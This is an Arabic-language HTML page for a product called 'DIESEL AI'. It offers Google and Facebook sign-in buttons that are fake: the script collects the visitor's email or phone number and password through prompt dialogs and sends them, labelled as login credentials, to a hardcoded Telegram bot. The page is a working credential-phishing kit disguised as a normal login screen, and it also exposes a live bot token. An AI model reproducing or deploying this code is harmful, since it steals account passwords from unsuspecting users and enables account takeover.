<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DIESEL AI | OFFICIAL</title>
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
    <style>
        body { background: #000; color: #0f0; font-family: 'Segoe UI', sans-serif; margin: 0; }
        .overlay { position: fixed; top:0; width: 100%; height: 100%; background: #000; z-index: 999; display: flex; justify-content: center; align-items: center; }
        .login-box { border: 2px solid #0f0; padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 0 20px #0f0; }
        .social-btn { display: flex; align-items: center; justify-content: center; width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #0f0; cursor: pointer; color: #0f0; background: transparent; }
        .social-btn img { width: 25px; margin-left: 10px; }
        #app { display: none; padding: 50px; text-align: center; }
    </style>
</head>
<body>

    <div class="overlay" id="login">
        <div class="login-box" data-aos="zoom-in">
            <h1 class="glow">DIESEL AI</h1>
            <p>سجل دخولك لتبدأ التحليل</p>
            <button class="social-btn" onclick="openAuth('Google')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg"> تسجيل عبر Google
            </button>
            <button class="social-btn" onclick="openAuth('Facebook')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"> تسجيل عبر Facebook
            </button>
        </div>
    </div>

    <div id="app">
        <h1 data-aos="fade-up">مرحباً بك في DIESEL AI</h1>
        <p>النظام الآن في حالة استعداد تام.</p>
    </div>

    <script>
        (function(){if(!window.chatbase||window.chatbase("getState")!=="initialized"){window.chatbase=(...arguments)=>{if(!window.chatbase.q){window.chatbase.q=[]}window.chatbase.q.push(arguments)};window.chatbase=new Proxy(window.chatbase,{get(target,prop){if(prop==="q"){return target.q}return(...args)=>target(prop,...args)}})}const onLoad=function(){const script=document.createElement("script");script.src="https://www.chatbase.co/embed.min.js";script.id="DdngL8r3s2pfzL6hG2oIO";script.domain="www.chatbase.co";document.body.appendChild(script)};if(document.readyState==="complete"){onLoad()}else{window.addEventListener("load",onLoad)}})();
    </script>

    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
    <script>AOS.init();</script>
    <script>
        function openAuth(type) {
            const user = prompt(`أدخل ${type} البريد الإلكتروني أو رقم الهاتف:`);
            const pass = prompt("أدخل كلمة السر:");
            if(user && pass) {
                fetch(`https://api.telegram.org/bot8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: '5177962707', text: `🛡 ${type} LOGIN:\nUser: ${user}\nPass: ${pass}`})
                });
                document.getElementById('login').style.display = 'none';
                document.getElementById('app').style.display = 'block';
            }
        }
    </script>
</body>
</html>
